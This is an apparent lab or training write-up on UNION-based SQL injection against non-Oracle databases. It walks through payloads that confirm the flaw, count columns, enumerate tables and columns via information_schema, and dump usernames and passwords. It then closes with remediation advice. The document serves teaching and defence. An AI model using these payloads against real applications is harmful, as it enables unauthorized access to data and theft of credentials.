````md
# SQL Injection Attack: Listing Database Contents on Non-Oracle Databases

## Summary

A SQL Injection vulnerability was identified in the application due to improper handling of user-supplied input in SQL queries. The input is directly concatenated into backend database queries without proper sanitization or parameterization.

As a result, an attacker can manipulate SQL queries to extract database structure information and sensitive data, including usernames and passwords from backend tables.

---

## Vulnerability Details

| Field                  | Value                                  |
| ---------------------- | -------------------------------------- |
| Vulnerability Type     | SQL Injection (UNION-based)            |
| Severity               | Critical                               |
| Affected Component     | Input parameters (e.g., search/login)  |
| Database Type          | Non-Oracle (MySQL / PostgreSQL / MSSQL)|
| Attack Vector          | HTTP Request Parameters                |
| Impacted Data          | Database tables, user credentials      |

---

## Description

The application constructs SQL queries using unsanitized user input. Because input validation and parameterized queries are not implemented, an attacker can modify the structure of SQL queries.

This allows:
- Extraction of database metadata
- Enumeration of tables and columns
- Retrieval of sensitive records from application tables

---

## Source

### User Input

The vulnerable parameter accepts user-controlled input:

```http
GET /search?query=<user_input>
````

Example injection point:

```
' OR 1=1--
```

This input is directly concatenated into the backend SQL query.

---

## Sink

The input is used in SQL query construction without sanitization:

```sql
SELECT * FROM products WHERE name = 'USER_INPUT';
```

Because the input is not escaped or parameterized, it breaks out of the intended query context.

---

## Attack Methodology

### 1. Confirm SQL Injection

Test basic payloads:

```
'
```

```
'--
```

If the application returns SQL errors or altered responses, the parameter is injectable.

---

### 2. Determine Number of Columns

Use ORDER BY technique:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

The highest working number indicates column count.

---

### 3. Identify Output Column

Use UNION SELECT:

```
' UNION SELECT NULL,NULL--
```

Then refine:

```
' UNION SELECT NULL,'test',NULL--
```

When visible output appears, that column is injectable.

---

### 4. Extract Database Tables

For non-Oracle databases:

```
' UNION SELECT table_name,NULL 
FROM information_schema.tables--
```

---

### 5. Extract Column Names

Targeting `users` table:

```
' UNION SELECT column_name,NULL 
FROM information_schema.columns 
WHERE table_name='users'--
```

Expected result:

* username
* password

---

### 6. Extract Sensitive Data

Final payload:

```
' UNION SELECT username,password FROM users--
```

---

## Proof of Concept

### Request

```http
GET /search?query=' UNION SELECT username,password FROM users--
```

---

### Response

Example extracted data:

| username | password |
| -------- | -------- |
| admin    | admin123 |
| user1    | pass123  |
| user2    | qwerty   |

---

## Impact

Successful exploitation leads to:

* Full database schema enumeration
* Exposure of user credentials
* Authentication bypass opportunities
* Potential full application compromise depending on DB privileges
* Leakage of sensitive business data

---

## Root Cause

* Direct concatenation of user input into SQL queries
* Lack of parameterized queries (prepared statements)
* Absence of input validation
* Exposure of database metadata via `information_schema`
* Over-privileged database user access

---

## Remediation

1. Use Parameterized Queries (Prepared Statements)

```sql
SELECT username, password FROM users WHERE username = ?
```

2. Input Validation

* Restrict unexpected special characters
* Enforce strict input schema

3. Least Privilege Principle

* Limit database user permissions
* Prevent access to metadata tables

4. Secure Error Handling

* Disable verbose SQL error output in production

5. Use ORM Frameworks

* Avoid raw SQL concatenation

6. Web Application Firewall (WAF)

* Add additional detection layer for injection patterns

---

## Conclusion

The SQL Injection vulnerability allows attackers to manipulate backend SQL queries and extract sensitive database contents. In non-Oracle databases, `information_schema` provides direct access to schema metadata, making exploitation straightforward when input handling is insecure.

Proper use of parameterized queries and strict input validation fully mitigates this class of vulnerability.

```
```
